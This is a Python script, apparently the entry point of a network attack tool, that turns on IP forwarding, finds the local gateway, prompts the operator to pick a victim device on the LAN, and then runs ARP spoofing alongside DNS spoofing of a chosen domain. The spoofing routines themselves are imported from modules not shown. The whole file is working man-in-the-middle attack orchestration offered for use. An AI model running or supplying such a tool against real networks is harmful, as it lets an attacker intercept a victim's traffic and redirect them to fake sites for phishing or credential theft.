import os
import sys
import threading
import argparse
import subprocess
from arp_spoofing import arp_spoof, restore_arp
from dns_spoofing import start_dns_sniffing
from cli_utils import select_target_device, print_network_info
from network_utils import (
    get_primary_ipv4_interface, get_ipv4_address,
    get_gateway_ip, get_gateway_mac
)

def parse_args():
    parser = argparse.ArgumentParser(
        description=(
            "This script performs DNS spoofing on a selected target in your network.\n"
        )
    )

    parser.add_argument(
        "-target-domain",
        required=True,
        help=(
            "[Required] Domain to spoof (e.g., google.com). "
            "This is the domain for which DNS responses will be spoofed."
        )
    )

    parser.add_argument(
        "-dns-server",
        default="8.8.8.8",
        help=(
            "[Optional] Fallback DNS server for all other domains.\n"
            "Default: 8.8.8.8"
        )
    )

    return parser.parse_args()

def enable_ip_forwarding():
    """
    Enables IP forwarding on the system to allow traffic to be routed through the local machine.
    """
    if os.name == "nt":
        raise RuntimeError("IP forwarding setup is not supported on Windows by this script.")
    
    try:
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print("IP forwarding enabled.")
    except Exception as e:
        raise RuntimeError(f"Failed to enable IP forwarding: {e}")
        
def run_attack(target_ip, target_mac, gateway_ip, gateway_mac, interface, local_ip, target_domain, dns_server):
    """
    Starts ARP spoofing in a background thread and DNS spoofing in the main thread.
    Restore ARP tables when script is interrupted by user.
    """
    stop_event = threading.Event()
    arp_thread = threading.Thread(
        target=arp_spoof,
        args=(target_ip, target_mac, gateway_ip, gateway_mac, interface, stop_event),
        daemon=True
    )
    arp_thread.start()

    try:
        start_dns_sniffing(
            target_ip, target_mac, local_ip, interface, target_domain, dns_server
        )

    # Run until script ist interrupted by user
    except KeyboardInterrupt:
        print("\nStopping and restoring ARP tables...")

        # Signal the ARP thread to stop
        stop_event.set()

        # Restore ARP tables to their original state
        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, interface)
        sys.exit(0)

if __name__ == "__main__":
    """
    Starts the DNS spoofing attack by selecting a reachable target device 
    in the local network and running the attack.
    """
    if os.geteuid() != 0:
        raise RuntimeError(
            "Please run this script as root.\n"
            "This script requires Scapy, which needs elevated privileges for certain functions."
        )

    # Parse input parameters
    args = parse_args()
    TARGET_DOMAIN = args.target_domain
    DNS_SERVER = args.dns_server
    
    enable_ip_forwarding()

    # Automatically detect local network info
    INTERFACE = get_primary_ipv4_interface()
    if not INTERFACE:
        raise RuntimeError("Couldn't detect the default network interface.")
    
    LOCAL_IP = get_ipv4_address(INTERFACE)
    if not LOCAL_IP:
        raise RuntimeError("Couldn't determine the local IP address of the interface.")
    
    GATEWAY_IP = get_gateway_ip()
    if not GATEWAY_IP:
        raise RuntimeError("Couldn't determine the gateway IP address.")
    
    # Print the gathered network informations
    print_network_info(INTERFACE, LOCAL_IP, GATEWAY_IP)

    # Search for target devices in the local network &
    # promt user to select one
    TARGET_IP, TARGET_MAC, TARGET_NAME = select_target_device(LOCAL_IP)
    if not TARGET_IP or not TARGET_MAC or not TARGET_NAME:
        raise RuntimeError("No target device selected or found.")

    GATEWAY_MAC = get_gateway_mac(GATEWAY_IP, INTERFACE)
    
    run_attack(
        TARGET_IP, TARGET_MAC, GATEWAY_IP, GATEWAY_MAC, INTERFACE,
        LOCAL_IP, TARGET_DOMAIN, DNS_SERVER
    )